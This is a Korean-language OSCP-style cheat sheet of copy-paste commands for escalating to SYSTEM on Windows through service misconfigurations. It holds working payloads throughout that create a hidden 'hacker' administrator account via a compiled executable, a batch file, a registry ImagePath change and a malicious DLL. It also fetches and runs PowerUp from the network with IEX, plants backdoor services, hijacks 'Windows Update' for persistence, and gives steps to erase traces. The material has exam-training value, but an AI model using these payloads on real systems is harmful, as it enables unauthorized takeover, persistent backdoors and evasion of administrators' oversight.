# Windows Service Exploits Privilege Escalation

> **OSCP 핵심**: Windows 서비스 취약점을 악용하여 즉시 SYSTEM 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 Unquoted Service Path 찾기 (30초 안에)

```cmd
:: 가장 중요한 취약점 - Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: 더 상세한 검색
for /f "tokens=2" %n in ('sc query state^= all ^| findstr SERVICE_NAME') do @echo %n & @sc qc %n | findstr BINARY_PATH_NAME | findstr /v """

:: PowerShell 버전
powershell "Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.PathName -notlike '*\Windows\*' -and $_.PathName -notlike '`"*'} | Select-Object Name, DisplayName, PathName"
```

### 🎯 서비스 권한 확인 (즉시)

```cmd
:: 모든 서비스의 권한 확인 (accesschk 필요)
accesschk.exe -uwcqv "Authenticated Users" * 2>nul
accesschk.exe -uwcqv "Everyone" * 2>nul
accesschk.exe -uwcqv %USERNAME% * 2>nul

:: 특정 서비스 권한 확인
sc sdshow ServiceName
sc qc ServiceName

:: 서비스 실행 파일 권한 확인
icacls "C:\Path\To\Service.exe"
```

### ⚡ 서비스 정보 수집

```cmd
:: 실행 중인 서비스들
sc query state= all | findstr "SERVICE_NAME\|STATE"
net start

:: 서비스 상세 정보
wmic service get name,displayname,pathname,startmode,state,startname | findstr /i "running\|auto"

:: 서비스 시작 모드
sc query type= service state= all | findstr "SERVICE_NAME\|START_TYPE"
```

## 📋 단계별 체크리스트

### Phase 1: 서비스 발견 및 분류 (2분)

- [ ] **Unquoted Service Path**: 공백이 포함된 경로에 따옴표 없는 서비스
- [ ] **Service Permissions**: 서비스 설정을 수정할 수 있는 권한
- [ ] **Binary Permissions**: 서비스 실행 파일을 수정할 수 있는 권한
- [ ] **Service Registry**: 서비스 레지스트리 키 수정 권한
- [ ] **DLL Hijacking**: 서비스가 로드하는 DLL 하이재킹 가능성

### Phase 2: 권한 분석 (3분)

- [ ] **Write 권한**: 서비스나 실행 파일에 쓰기 권한 확인
- [ ] **Modify 권한**: 서비스 설정 변경 권한 확인
- [ ] **Full Control**: 서비스에 대한 완전한 제어 권한
- [ ] **Registry 권한**: 서비스 레지스트리 키 접근 권한
- [ ] **Directory 권한**: 서비스 실행 파일 디렉토리 권한

### Phase 3: 익스플로잇 가능성 확인 (2분)

- [ ] **Restart 권한**: 서비스를 재시작할 수 있는지 확인
- [ ] **Start/Stop 권한**: 서비스 제어 권한 확인
- [ ] **파일 교체 가능**: 실행 파일이나 DLL 교체 가능한지
- [ ] **경로 주입 가능**: Unquoted path에서 악성 실행 파일 주입
- [ ] **권한 상승 후 실행**: 서비스가 SYSTEM 권한으로 실행되는지

## 🎯 발견별 즉시 익스플로잇

### 🚨 Unquoted Service Path 익스플로잇

```cmd
:: 1. 취약한 서비스 확인 (예: C:\Program Files\Some Service\service.exe)
sc qc VulnerableService

:: 2. 경로 분석 - 주입 가능한 위치 확인
:: C:\Program Files\Some Service\service.exe
:: 시도 순서: C:\Program.exe -> C:\Program Files\Some.exe

:: 3. 디렉토리 쓰기 권한 확인
icacls "C:\"
icacls "C:\Program Files\"

:: 4. 악성 실행 파일 생성 (C로 컴파일)
echo #include ^<windows.h^> > evil.c
echo #include ^<stdio.h^> >> evil.c
echo int main() { >> evil.c
echo     system("net user hacker password123 /add"); >> evil.c
echo     system("net localgroup administrators hacker /add"); >> evil.c
echo     return 0; >> evil.c
echo } >> evil.c

:: 5. 컴파일 (gcc 있는 경우)
gcc evil.c -o Program.exe

:: 6. 파일 배치
copy Program.exe "C:\Program.exe"

:: 7. 서비스 재시작
sc stop VulnerableService
sc start VulnerableService

:: 또는 시스템 재부팅 기다리기
```

```powershell
# PowerShell로 Unquoted Service Path 익스플로잇
# 1. 취약한 서비스 찾기
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike "`"*" -and $_.PathName -like "* *"} | Select-Object Name, PathName

# 2. 악성 실행 파일 생성 (PowerShell)
$payload = @'
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class Program {
    public static void Main() {
        Process.Start("cmd.exe", "/c net user hacker password123 /add & net localgroup administrators hacker /add");
    }
}
"@
[Program]::Main()
'@

# 3. 실행 파일로 저장
$payload | Out-File -FilePath C:\Program.exe -Encoding ASCII

# 4. 서비스 재시작
Restart-Service VulnerableService
```

### 🔧 Service Permissions 익스플로잇

```cmd
:: 1. 서비스 권한 확인
accesschk.exe -uwcqv %USERNAME% VulnerableService

:: 2. 서비스 설정 변경 권한이 있는 경우
:: 서비스 실행 파일 경로를 악성 파일로 변경

:: 3. 악성 실행 파일 생성
echo net user hacker password123 /add > C:\Windows\Temp\evil.bat
echo net localgroup administrators hacker /add >> C:\Windows\Temp\evil.bat

:: 4. 서비스 설정 변경
sc config VulnerableService binpath= "C:\Windows\Temp\evil.bat"

:: 5. 서비스 재시작
sc stop VulnerableService
sc start VulnerableService

:: 6. 원래 설정으로 복구 (흔적 제거)
sc config VulnerableService binpath= "원래경로"
```

### 📁 Service Binary Permissions 익스플로잇

```cmd
:: 1. 서비스 실행 파일 권한 확인
sc qc VulnerableService
icacls "C:\Path\To\Service.exe"

:: 2. 쓰기 권한이 있는 경우 백업 생성
copy "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"

:: 3. 악성 실행 파일로 교체
copy evil.exe "C:\Path\To\Service.exe"

:: 4. 서비스 재시작
sc stop VulnerableService
sc start VulnerableService

:: 5. 원본 파일 복구
copy "C:\Path\To\Service.exe.bak" "C:\Path\To\Service.exe"
```

### 🗝️ Service Registry 익스플로잇

```cmd
:: 1. 서비스 레지스트리 키 권한 확인
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

:: 2. 특정 서비스 레지스트리 권한 확인
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService

:: 3. 레지스트리에서 서비스 경로 변경
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\evil.exe" /f

:: 4. 서비스 재시작
sc stop VulnerableService
sc start VulnerableService
```

### 📚 DLL Hijacking 익스플로잇

```cmd
:: 1. 서비스가 로드하는 DLL 확인
:: Process Monitor나 Dependency Walker 사용
:: 또는 서비스 실행 파일 분석

:: 2. 찾을 수 없는 DLL이나 상대 경로로 로드되는 DLL 확인
:: 일반적인 후보: version.dll, dwmapi.dll, comctl32.dll

:: 3. 악성 DLL 생성 (C++)
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("net user hacker password123 /add & net localgroup administrators hacker /add");
    }
    return TRUE;
}

:: 4. DLL 컴파일
gcc -shared -o hijack.dll dllmain.c -Wl,--out-implib,hijack.lib

:: 5. DLL을 서비스 디렉토리에 배치
copy hijack.dll "C:\Path\To\Service\Directory\missing.dll"

:: 6. 서비스 재시작
sc stop VulnerableService
sc start VulnerableService
```

## 🤖 자동화 도구 활용

### 🔍 PowerUp 서비스 스캔

```powershell
# PowerUp 다운로드 및 실행
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 모든 서비스 취약점 검사
Invoke-AllChecks

# 개별 서비스 검사
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
Get-ServiceUnquoted

# 서비스 익스플로잇 실행
Invoke-ServiceAbuse -ServiceName VulnerableService -Command "net user hacker password123 /add"
```

### 🎯 WinPEAS 서비스 분석

```cmd
:: WinPEAS 서비스 관련 정보만 추출
winPEAS.exe servicesinfo

:: 결과에서 서비스 취약점만 필터링
winPEAS.exe | findstr /i "Unquoted\|Modifiable\|WritePermissions"
```

### 🔧 AccessChk 서비스 권한 분석

```cmd
:: accesschk 다운로드 (Sysinternals)
:: https://download.sysinternals.com/files/AccessChk.zip

:: 현재 사용자의 서비스 권한 확인
accesschk.exe -uwcqv %USERNAME% * 2>nul | findstr "RW\|SERVICE_ALL_ACCESS\|SERVICE_CHANGE_CONFIG"

:: Everyone 그룹의 서비스 권한
accesschk.exe -uwcqv "Everyone" * 2>nul

:: Authenticated Users 그룹의 서비스 권한
accesschk.exe -uwcqv "Authenticated Users" * 2>nul

:: 특정 서비스 상세 권한
accesschk.exe -cv ServiceName
```

### 🕵️ 서비스 익스플로잇 자동화 스크립트

```cmd
:: 종합 서비스 취약점 스캔 스크립트 (복붙용)
@echo off
echo ===== WINDOWS SERVICE EXPLOITATION SCAN =====
echo.

echo [+] Scanning for Unquoted Service Paths...
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
echo.

echo [+] Checking service permissions with current user...
if exist accesschk.exe (
    accesschk.exe -uwcqv %USERNAME% * 2>nul | findstr "RW\|SERVICE_ALL_ACCESS"
) else (
    echo AccessChk not found. Download from: https://download.sysinternals.com/files/AccessChk.zip
)
echo.

echo [+] Checking modifiable service binaries...
for /f "tokens=2*" %%i in ('sc query state^= all ^| findstr "SERVICE_NAME"') do (
    for /f "tokens=3*" %%k in ('sc qc %%j ^| findstr "BINARY_PATH_NAME"') do (
        icacls %%k 2>nul | findstr /i "%USERNAME%\|Everyone\|Users" >nul && echo Modifiable: %%j - %%k
    )
)
echo.

echo [+] Checking for services running as SYSTEM...
wmic service where "startname='LocalSystem'" get name,displayname,pathname,startmode
echo.

echo ===== SCAN COMPLETE =====
```

```powershell
# PowerShell 서비스 취약점 스캔 스크립트 (복붙용)
Write-Host "===== WINDOWS SERVICE EXPLOITATION SCAN =====" -ForegroundColor Green

Write-Host "`n[+] Scanning for Unquoted Service Paths..." -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike "`"*" -and $_.PathName -like "* *"} | Select-Object Name, DisplayName, PathName

Write-Host "`n[+] Checking for modifiable services..." -ForegroundColor Yellow
Get-WmiObject win32_service | ForEach-Object {
    $servicePath = $_.PathName -replace '"', '' -replace ' /.*', ''
    if (Test-Path $servicePath -ErrorAction SilentlyContinue) {
        try {
            $acl = Get-Acl $servicePath -ErrorAction Stop
            if ($acl.AccessToString -match $env:USERNAME -or $acl.AccessToString -match "Everyone" -or $acl.AccessToString -match "Users") {
                Write-Host "Modifiable service: $($_.Name) - $servicePath" -ForegroundColor Red
            }
        } catch {}
    }
}

Write-Host "`n[+] Services running as SYSTEM..." -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, DisplayName, PathName, State

Write-Host "`n===== SCAN COMPLETE =====" -ForegroundColor Green
```

## 👀 놓치기 쉬운 것들

### 🚨 고급 서비스 익스플로잇 기법

```cmd
:: 1. 서비스 dependency 악용
:: 종속 서비스를 통한 간접 공격
sc enumdepend VulnerableService
sc qc DependentService

:: 2. 서비스 계정 권한 확인
:: 서비스가 다른 계정으로 실행되는 경우
wmic service get name,startname | findstr /v "LocalSystem\|NT AUTHORITY"

:: 3. 서비스 로그온 권한 (SeServiceLogonRight)
whoami /priv | findstr "SeServiceLogonRight"

:: 4. 서비스 생성 권한 (Create Service)
accesschk.exe -uwcqv %USERNAME% "NT SERVICE\TrustedInstaller"

:: 5. 서비스 설치 파일 권한
:: MSI 설치 파일이나 서비스 설치 스크립트
dir /b /s C:\ | findstr /i "setup\|install" | findstr "\.exe$\|\.msi$"

:: 6. 임시 서비스 생성
:: 관리자 권한이 있는 경우 임시 서비스 생성
sc create TempService binpath= "C:\Windows\Temp\evil.exe"
sc start TempService
sc delete TempService

:: 7. 서비스 호스트 프로세스 (svchost.exe)
:: 여러 서비스를 호스팅하는 svchost 프로세스 분석
tasklist /svc | findstr svchost
```

### 🔍 DLL Hijacking 고급 기법

```cmd
:: 1. WinSxS 디렉토리 DLL 하이재킹
dir /b /s C:\Windows\WinSxS | findstr "\.dll$" | findstr version

:: 2. System32 DLL 프록시
:: 정상 DLL을 프록시하면서 악성 코드 실행
:: dllmain.c 예제:
/*
#include <windows.h>
HMODULE hMod;
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        hMod = LoadLibrary(L"C:\\Windows\\System32\\version_orig.dll");
        system("net user hacker password123 /add");
    }
    return TRUE;
}
// 원본 DLL 함수들을 프록시
*/

:: 3. COM 하이재킹
:: COM 객체 등록을 통한 DLL 하이재킹
reg query HKEY_CURRENT_USER\Software\Classes\CLSID
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID

:: 4. AppInit_DLLs 레지스트리
:: 모든 프로세스에 DLL 주입
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs

:: 5. 환경 변수 PATH DLL 하이재킹
:: PATH 환경 변수의 첫 번째 디렉토리에 악성 DLL 배치
echo %PATH%
```

### ⚡ 서비스 재시작 없이 익스플로잇

```cmd
:: 1. 서비스 중지 없이 실행 파일 교체
:: 파일이 사용 중일 때 교체 방법

:: 2. 심볼릭 링크 공격
mklink /H evil.exe "C:\Path\To\Service.exe"

:: 3. Junction Point 공격
mklink /J "C:\Program Files\Vulnerable" "C:\Windows\Temp"

:: 4. 하드링크 공격
fsutil hardlink create "C:\Windows\Temp\service.exe" "C:\Path\To\Original\Service.exe"

:: 5. 레지스트리 직접 수정 (재부팅 후 적용)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /d "C:\Windows\Temp\evil.exe" /f

:: 6. 스케줄된 작업을 통한 우회
schtasks /create /tn "ServiceRestart" /tr "sc stop VulnerableService & copy evil.exe service.exe & sc start VulnerableService" /sc onstart /ru system

:: 7. WMI 이벤트를 통한 자동 실행
:: 서비스 상태 변화를 모니터링하여 자동 익스플로잇
```

### 🔧 권한 확인 우회 기법

```cmd
:: 1. 다른 사용자 컨텍스트에서 권한 확인
runas /user:Administrator "accesschk.exe -uwcqv %USERNAME% *"

:: 2. PowerShell 실행 정책 우회
powershell -ExecutionPolicy Bypass -Command "Get-Service"

:: 3. WMIC을 통한 서비스 정보 수집
wmic service where "name='VulnerableService'" get *

:: 4. 레지스트리 직접 접근
reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService"

:: 5. 프로세스 덤프를 통한 정보 획득
tasklist /m | findstr "VulnerableService"

:: 6. 이벤트 로그에서 서비스 정보
wevtutil qe System /q:"*[System[Provider[@Name='Service Control Manager']]]" /f:text

:: 7. 네트워크를 통한 원격 서비스 열거 (도메인 환경)
sc \\target-machine query
```

### 💡 서비스 지속성 확보

```cmd
:: 1. 새로운 서비스 생성 (백도어)
sc create BackdoorService binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description BackdoorService "Windows System Service"

:: 2. 기존 서비스 수정 (은닉)
sc config "Windows Update" binpath= "C:\Windows\System32\svchost.exe -k netsvcs -p & C:\Windows\Temp\backdoor.exe"

:: 3. 서비스 DLL 교체 (지속성)
:: svchost가 호스팅하는 서비스의 DLL 교체
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\Parameters" /v ServiceDll

:: 4. 의존성 서비스 생성
sc create DependencyService binpath= "C:\Windows\Temp\backdoor.exe"
sc config MainService depend= DependencyService

:: 5. 서비스 복구 설정 악용
sc failure VulnerableService reset= 86400 actions= run/60000/run/60000/run/60000
sc failureflag VulnerableService 1
sc failure VulnerableService command= "C:\Windows\Temp\backdoor.exe"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: Unquoted service path와 기본 서비스 권한 확인
- **다음 3분**: accesschk으로 상세 권한 분석 및 PowerUp 실행
- **추가 2분**: 발견된 취약점에 대한 익스플로잇 시도
- **7분 후**: 서비스 재시작이 필요한 익스플로잇은 시간 고려

### 🎯 성공률 높은 순서

1. **Unquoted Service Path**: 가장 흔하고 확실한 Windows privesc
2. **Service Binary Permissions**: 실행 파일 교체 가능시 거의 확실
3. **Service Permissions**: 서비스 설정 변경 권한 있을 때
4. **DLL Hijacking**: 고급 기법이지만 탐지 어려움
5. **Registry Permissions**: 레지스트리 수정 권한 있을 때

### 🔥 즉시 시도할 것들

- Unquoted service path는 Windows에서 가장 흔한 벡터
- accesschk.exe 다운로드 후 즉시 권한 분석
- PowerUp 실행과 동시에 수동 확인 병행
- 서비스 재시작 권한 없으면 재부팅 대기 고려

### 💡 팁

- 서비스 익스플로잇은 Windows에서 가장 효과적인 privesc 방법
- accesschk.exe는 필수 도구 (Sysinternals에서 다운로드)
- 서비스 재시작이 필요한 경우가 많으므로 시간 고려
- 성공 후 지속성 확보를 위해 새 관리자 계정 생성
- 흔적 제거를 위해 원본 파일 복구나 설정 되돌리기
